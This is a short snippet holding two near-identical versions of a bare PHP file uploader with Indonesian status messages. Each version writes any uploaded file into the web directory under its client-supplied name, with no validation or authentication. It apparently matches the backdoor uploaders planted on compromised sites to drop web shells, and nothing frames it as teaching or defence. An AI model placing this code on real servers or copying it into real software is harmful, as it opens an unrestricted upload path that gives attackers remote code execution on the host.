<form method="POST" action="" enctype="multipart/form-data" >
<input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
<?php
if ($_FILES['file'] != '')
copy($_FILES['file']['tmp_name'], $_FILES['file']['name']) or die ('Proses upload Gagal: ');
else
{
die('Silahkan pilih file');
}
?>
========
<?php
echo '<form method="POST" action="" enctype="multipart/form-data" ><input type="file" name="file" /><input type="submit" value="Upload" /></form>';
if ($_FILES['file'] != '')
copy($_FILES['file']['tmp_name'], $_FILES['file']['name']) or die ('Proses upload Gagal: ');
else
{
die('Silahkan pilih file');
}
?>
